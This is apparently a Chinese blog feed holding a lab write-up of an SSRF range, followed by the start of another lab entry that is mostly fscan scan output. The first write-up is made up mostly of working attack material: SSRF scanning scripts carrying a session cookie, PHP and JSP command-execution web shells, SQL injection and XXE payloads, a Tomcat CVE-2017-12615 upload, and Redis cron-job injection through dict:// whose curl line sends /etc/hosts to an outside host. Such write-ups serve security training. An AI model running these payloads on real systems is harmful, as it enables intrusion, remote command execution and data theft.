class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>alive_ips = []<br><br>url = <span class="hljs-string">&quot;http://8.138.181.58:32780/&quot;</span><br>header=&#123;<span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;argon_user_token=f18a3b72b644797d7f5f2b4371711713&#x27;</span>&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">255</span>):<br>    ip = <span class="hljs-string">&quot;172.16.0.&quot;</span> + <span class="hljs-built_in">str</span>(i)<br>    <span class="hljs-keyword">try</span>:<br>        r = requests.post(url,headers=header, data=&#123;<span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">f&quot;dict://<span class="hljs-subst">&#123;ip&#125;</span>/&quot;</span>&#125;, timeout=<span class="hljs-number">1.5</span>)<br>        <span class="hljs-built_in">print</span>(ip + <span class="hljs-string">&quot;存活&quot;</span>)<br>        alive_ips.append(ip)<br>    <span class="hljs-keyword">except</span> requests.exceptions.Timeout:<br>        <span class="hljs-built_in">print</span>(ip + <span class="hljs-string">&quot;未存活&quot;</span>)<br>    time.sleep(<span class="hljs-number">0.5</span>)<br><br><span class="hljs-keyword">for</span> idx, ip <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(alive_ips, <span class="hljs-number">1</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;idx&#125;</span>. <span class="hljs-subst">&#123;ip&#125;</span>存活&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. <span class="hljs-number">172.16.0.1</span>存活<br><span class="hljs-attribute">2</span>. <span class="hljs-number">172.16.0.21</span>存活<br><span class="hljs-attribute">3</span>. <span class="hljs-number">172.16.0.22</span>存活<br><span class="hljs-attribute">4</span>. <span class="hljs-number">172.16.0.23</span>存活<br><span class="hljs-attribute">5</span>. <span class="hljs-number">172.16.0.24</span>存活<br><span class="hljs-attribute">6</span>. <span class="hljs-number">172.16.0.25</span>存活<br><span class="hljs-attribute">7</span>. <span class="hljs-number">172.16.0.26</span>存活<br><span class="hljs-attribute">8</span>. <span class="hljs-number">172.16.0.27</span>存活<br></code></pre></td></tr></table></figure><p><code>172.16.0.1</code>是不算,在扫描其他的端口情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>alive_ips = [<br>    <span class="hljs-string">&quot;172.16.0.21&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.22&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.23&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.24&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.25&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.26&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.27&quot;</span>,<br>]<br><br>url = <span class="hljs-string">&quot;http://8.138.181.58:32780/&quot;</span><br>header=&#123;<span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;argon_user_token=f18a3b72b644797d7f5f2b4371711713&#x27;</span>&#125;<br>common_ports = [<br>    <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">25</span>, <span class="hljs-number">53</span>, <span class="hljs-number">67</span>, <span class="hljs-number">68</span>, <span class="hljs-number">80</span>, <span class="hljs-number">110</span>, <span class="hljs-number">143</span>, <span class="hljs-number">443</span>,<br>    <span class="hljs-number">8080</span>, <span class="hljs-number">3306</span>, <span class="hljs-number">5432</span>, <span class="hljs-number">6379</span>, <span class="hljs-number">27017</span>, <span class="hljs-number">5900</span>, <span class="hljs-number">6379</span>, <span class="hljs-number">8000</span>, <span class="hljs-number">8888</span>,<br>    <span class="hljs-number">2049</span>, <span class="hljs-number">514</span>, <span class="hljs-number">1194</span>, <span class="hljs-number">9100</span>, <span class="hljs-number">139</span>, <span class="hljs-number">445</span>, <span class="hljs-number">161</span>, <span class="hljs-number">162</span>, <span class="hljs-number">3389</span>, <span class="hljs-number">1521</span>,<br>    <span class="hljs-number">3128</span><br>]<br><br>results = []<br><br><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> alive_ips.copy():<br>    <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> common_ports:<br>        target = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>&quot;</span><br>        r = requests.post(<br>            url,<br>            data=&#123;<span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">f&quot;dict://<span class="hljs-subst">&#123;target&#125;</span>/&quot;</span>&#125;,<br>        )<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;HTTP/1.1&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] <span class="hljs-subst">&#123;target&#125;</span> 服务存活&quot;</span>)<br>            results.append(target)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] <span class="hljs-subst">&#123;target&#125;</span> 服务不存活&quot;</span>)<br>        time.sleep(<span class="hljs-number">0.3</span>)<br><br><span class="hljs-comment"># 打印最终结果</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n======= 存活服务列表 =======&quot;</span>)<br><span class="hljs-keyword">for</span> idx, result <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(results, <span class="hljs-number">1</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;idx&#125;</span>. <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br><br><br><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. <span class="hljs-number">172.16.0.21:80</span><br><span class="hljs-attribute">2</span>. <span class="hljs-number">172.16.0.22:80</span><br><span class="hljs-attribute">3</span>. <span class="hljs-number">172.16.0.23:80</span><br><span class="hljs-attribute">4</span>. <span class="hljs-number">172.16.0.24:80</span><br><span class="hljs-attribute">5</span>. <span class="hljs-number">172.16.0.25:80</span><br><span class="hljs-attribute">6</span>. <span class="hljs-number">172.16.0.26:8080</span><br><span class="hljs-attribute">7</span>. <span class="hljs-number">172.16.0.27:6379</span><br></code></pre></td></tr></table></figure><h2 id="172-16-0-21"><a href="#172-16-0-21" class="headerlink" title="172.16.0.21"></a>172.16.0.21</h2><p>主站点使用<code>file:///etc/hosts</code>直接拿下</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408173918386.png" alt="image-20250408173918386"></p><h2 id="172-16-0-22"><a href="#172-16-0-22" class="headerlink" title="172.16.0.22"></a>172.16.0.22</h2><p>使用脚本扫描站点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://8.138.181.58:32780/&quot;</span><br>header=&#123;<span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;argon_user_token=f18a3b72b644797d7f5f2b4371711713&#x27;</span>&#125;<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;字典&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> f:<br>            payload = <span class="hljs-string">f&quot;http://172.16.0.22/<span class="hljs-subst">&#123;a.strip()&#125;</span>&quot;</span><br>            r = requests.post(url, headers=header, data=&#123;<span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;payload&#125;</span>&quot;</span>&#125;)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;not found&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                time.sleep(<span class="hljs-number">0.3</span>)<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-built_in">print</span>(payload+<span class="hljs-string">&quot;存在&quot;</span>)<br>            time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.16.0.22/shell.php存在</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.16.0.22/phpinfo.php存在</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408175815246.png" alt="image-20250408175815246"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>直接rce</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408180118005.png" alt="image-20250408180118005"></p><p>拿下</p><h2 id="172-16-0-23"><a href="#172-16-0-23" class="headerlink" title="172.16.0.23"></a>172.16.0.23</h2><p>扫描结果:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.16.0.23/index.php存在</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408221700376.png" alt="image-20250408221700376"></p><p>sql注入，没有任何的过滤，我们直接打</p><p>测试发现有四个字段：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.16.0.23</span>/?id=-<span class="hljs-number">1</span>&#x27;union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>--+<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408221908874.png" alt="image-20250408221908874"></p><p>回显是4,我们直接加载文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.16.0.23</span>/?id=-<span class="hljs-number">1</span>&#x27;union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,load_file(&#x27;/etc/hosts&#x27;)--+<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408222002410.png" alt="image-20250408222002410"></p><h2 id="172-16-0-24"><a href="#172-16-0-24" class="headerlink" title="172.16.0.24"></a>172.16.0.24</h2><p>后面的靶场均使用代理出来正常打，在转化为SSRF打法</p><p>扫描结果:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.16.0.25/index.php存在</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408224712188.png" alt="image-20250408224712188"></p><h3 id="正常打法"><a href="#正常打法" class="headerlink" title="正常打法"></a>正常打法</h3><p>很经典的截断RCE</p><p>post上传：</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408224839796.png" alt="image-20250408224839796"></p><h3 id="SSRF打法"><a href="#SSRF打法" class="headerlink" title="SSRF打法"></a>SSRF打法</h3><p>把正常打法的整个数据包二次URL编码</p><p>注意点:</p><ul><li><code>Accept-Encoding: gzip, deflate</code>把这行删除，不然会出现乱码，因为被两次gzip编码了，</li><li>需要抓一个正常的POST包，然后自己把<code>host</code>等类似的东西改掉，然后全选进行全编码(Convert selection-&gt;URL-&gt;URL-encode all characters )</li></ul><p>利用gopher协议打</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408225016798.png" alt="image-20250408225016798"></p><h2 id="172-16-0-25"><a href="#172-16-0-25" class="headerlink" title="172.16.0.25"></a>172.16.0.25</h2><p>扫描结果:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.16.0.25/index.php存在</span><br></code></pre></td></tr></table></figure><h3 id="正常打法-1"><a href="#正常打法-1" class="headerlink" title="正常打法"></a>正常打法</h3><p>随便上传抓包试试</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408225308832.png" alt="image-20250408225308832"></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408225323772.png" alt="image-20250408225323772"></p><p>用户登录xml文档解析的</p><p>我们直接打XXE</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">demo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>成功RCE</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408231953379.png" alt="image-20250408231953379"></p><h3 id="SSRF打法-1"><a href="#SSRF打法-1" class="headerlink" title="SSRF打法"></a>SSRF打法</h3><p>把正常打的整个数据包二次url编码，打gopher协议</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.16.0.25:80/_2次编码后的tcp流</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408232051621.png" alt="image-20250408232051621"></p><h2 id="172-16-0-26"><a href="#172-16-0-26" class="headerlink" title="172.16.0.26"></a>172.16.0.26</h2><p>场景是一个 Tomcat 中间件，存在 CVE-2017-12615 任意写文件漏洞，这在 Tomcat 漏洞历史中也是比较经典第一个</p><h3 id="正常打法-2"><a href="#正常打法-2" class="headerlink" title="正常打法"></a>正常打法</h3><p>PUT文件上传：</p><p>上传jsp马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-keyword">if</span>(command != <span class="hljs-literal">null</span>)<br>    &#123;<br>        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)<br>        &#123;<br>            out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b));<br>        &#125;<br>        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        out.print(<span class="hljs-string">&quot;format: xxx.jsp?cmd=Command&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409110428160.png" alt="image-20250409110428160"></p><p>正常访问木马</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409110450918.png" alt="image-20250409110450918"></p><h3 id="SSRF打法-2"><a href="#SSRF打法-2" class="headerlink" title="SSRF打法"></a>SSRF打法</h3><p>把正常传马的数据包2次url编码使用gopher协议上传</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409111321133.png" alt="image-20250409111321133"></p><p>把访问马的数据包同意操作或者使用http协议访问</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409112148831.png" alt="image-20250409112148831"></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409111432179.png" alt="image-20250409111432179"></p><h2 id="172-16-0-27"><a href="#172-16-0-27" class="headerlink" title="172.16.0.27"></a>172.16.0.27</h2><h3 id="正常打法-3"><a href="#正常打法-3" class="headerlink" title="正常打法"></a>正常打法</h3><p>代理出来使用工具连接执行命令</p><h3 id="SSRF打法-3"><a href="#SSRF打法-3" class="headerlink" title="SSRF打法"></a>SSRF打法</h3><p>端口扫描的是6379存活，使用dict协议看看是什么</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409112307716.png" alt="image-20250409112307716"></p><p>是redis数据库而且未授权</p><p>系统没有 Web 服务（无法写 Shell），无 SSH 公私钥认证（无法写公钥），所以打算定时任务</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 清空 key</span><br>dict:<span class="hljs-string">//172.16.0.27</span><span class="hljs-function">:6379</span>/flushall<br><br><span class="hljs-comment"># 设置要操作的路径为定时任务目录</span><br>dict:<span class="hljs-string">//172.16.0.27</span><span class="hljs-function">:6379</span>/config <span class="hljs-keyword">set</span> dir <span class="hljs-string">/var/spool/cron/</span><br><br><span class="hljs-comment"># 在定时任务目录下创建 root 的定时任务文件</span><br>dict:<span class="hljs-string">//172.16.0.27</span><span class="hljs-function">:6379</span>/config <span class="hljs-keyword">set</span> dbfilename root<br><br><span class="hljs-comment"># 外带/etc/hosts文件</span><br>dict:<span class="hljs-string">//172.16.0.27</span><span class="hljs-function">:6379</span>/<span class="hljs-keyword">set</span> x &#x27;\n* * * * * curl <span class="hljs-params">--get</span> <span class="hljs-params">--data-urlencode</span> <span class="hljs-string">&quot;f=$(cat /etc/hosts)&quot;</span> <span class="hljs-string">&quot;http://ip:32777&quot;</span>\n&#x27;<br><br><span class="hljs-comment"># 保存上述操作</span><br>dict:<span class="hljs-string">//172.16.0.27</span><span class="hljs-function">:6379</span>/save<br><br></code></pre></td></tr></table></figure><p>但是不知道为什么一连上就掉了</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409122659944.png" alt="image-20250409122659944"></p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssrf</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cyberstrikelab_Pearl</title>
    <link href="/2025/04/03/cyberstrikelab-Pearl/"/>
    <url>/2025/04/03/cyberstrikelab-Pearl/</url>
    
    <content type="html"><![CDATA[<h1 id="开干"><a href="#开干" class="headerlink" title="开干"></a>开干</h1><p><strong>题目描述</strong>：珍珠珍珠亮晶晶。。</p><p>挂上vpn直接开打</p><p>先用fscan扫下外围</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">[2025-04-03 18:25:52] [SUCCESS] 目标 192.168.10.42   存活 (ICMP)                                                             <br>[2025-04-03 18:25:53] [SUCCESS] 目标 192.168.10.65   存活 (ICMP)                                                             <br>[2025-04-03 18:25:53] [SUCCESS] 目标 192.168.10.233  存活 (ICMP)                                                             <br>[2025-04-03 18:25:55] [INFO] 存活主机数量: 3                                                                                   <br>[2025-04-03 18:25:55] [INFO] 有效端口数量: 233                                                                                 <br>[2025-04-03 18:25:56] [SUCCESS] 端口开放 192.168.10.65:80                                                                    <br>[2025-04-03 18:25:56] [SUCCESS] 端口开放 192.168.10.42:22                                                                    <br>[2025-04-03 18:25:56] [SUCCESS] 端口开放 192.168.10.233:22                                                                   <br>[2025-04-03 18:25:56] [SUCCESS] 端口开放 192.168.10.65:135                                                                   <br>[2025-04-03 18:25:56] [SUCCESS] 服务识别 192.168.10.42:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.          <br>0-OpenSSH_7.4.]                                                                                                          <br>[2025-04-03 18:25:56] [SUCCESS] 服务识别 192.168.10.233:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2          <br>.0-OpenSSH_7.4.]                                                                                                         <br>[2025-04-03 18:25:56] [SUCCESS] 端口开放 192.168.10.65:139                                                                   <br>[2025-04-03 18:25:58] [SUCCESS] 端口开放 192.168.10.65:445                                                                   <br>[2025-04-03 18:26:01] [SUCCESS] 端口开放 192.168.10.42:3306                                                                  <br>[2025-04-03 18:26:01] [SUCCESS] 端口开放 192.168.10.65:3306                                                                  <br>[2025-04-03 18:26:01] [SUCCESS] 服务识别 192.168.10.65:139 =&gt;  Banner:[.]                                                    <br>[2025-04-03 18:26:02] [SUCCESS] 服务识别 192.168.10.65:80 =&gt; [http]                                                          <br>[2025-04-03 18:26:05] [SUCCESS] 服务识别 192.168.10.65:445 =&gt;                                                                <br>[2025-04-03 18:26:09] [SUCCESS] 端口开放 192.168.10.233:8080                                                                 <br>[2025-04-03 18:26:09] [SUCCESS] 服务识别 192.168.10.42:3306 =&gt; [mysql] 版本:5.5.23 产品:MySQL Banner:[J.5.5.23.wC*DYsU2.6        <br>W8M]iw=fja<span class="hljs-string">&#x27; mysql_native_password]                                                                                       </span><br><span class="hljs-string">[2025-04-03 18:26:14] [SUCCESS] 服务识别 192.168.10.233:8080 =&gt; [http] Banner:[HTTP/1.0 400 Bad Request.Client sent an HT    </span><br><span class="hljs-string">TP request to an HTTPS server.]                                                                                          </span><br><span class="hljs-string">[2025-04-03 18:26:23] [SUCCESS] 服务识别 192.168.10.65:3306 =&gt;  Banner:[G.j Host &#x27;</span>192.168.122.20<span class="hljs-string">&#x27; is not allowed to conne    </span><br><span class="hljs-string">ct to this MySQL server]                                                                                                 </span><br><span class="hljs-string">[2025-04-03 18:27:01] [SUCCESS] 服务识别 192.168.10.65:135 =&gt;                                                                </span><br><span class="hljs-string">[2025-04-03 18:27:01] [INFO] 存活端口数量: 9                                                                                   </span><br><span class="hljs-string">[2025-04-03 18:27:01] [INFO] 开始漏洞扫描                                                                                      </span><br><span class="hljs-string">[2025-04-03 18:27:01] [INFO] 加载的插件: findnet, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle         </span><br><span class="hljs-string">[2025-04-03 18:27:02] [SUCCESS] NetInfo 扫描结果                                                                             </span><br><span class="hljs-string">目标主机: 192.168.10.65                                                                                                      </span><br><span class="hljs-string">主机名: WIN-BVAJO3C2D90                                                                                                     </span><br><span class="hljs-string">发现的网络接口:                                                                                                                 </span><br><span class="hljs-string">   IPv4地址:                                                                                                               </span><br><span class="hljs-string">      └─ 172.32.50.22                                                                                                    </span><br><span class="hljs-string">   IPv6地址:                                                                                                               </span><br><span class="hljs-string">      └─ 2002:ac20:3216::ac20:3216                                                                                       </span><br><span class="hljs-string">[2025-04-03 18:27:02] [SUCCESS] NetBios 192.168.10.65   WORKGROUP\WIN-BVAJO3C2D90           Windows Server 2012 R2 Standa</span><br><span class="hljs-string">rd 9600                                                                                                                  </span><br><span class="hljs-string">[2025-04-03 18:27:02] [SUCCESS] 网站标题 https://192.168.10.233:8080 状态码:404 长度:19     标题:无标题                                </span><br><span class="hljs-string">[2025-04-03 18:27:03] [SUCCESS] 网站标题 http://192.168.10.65      状态码:200 长度:8460   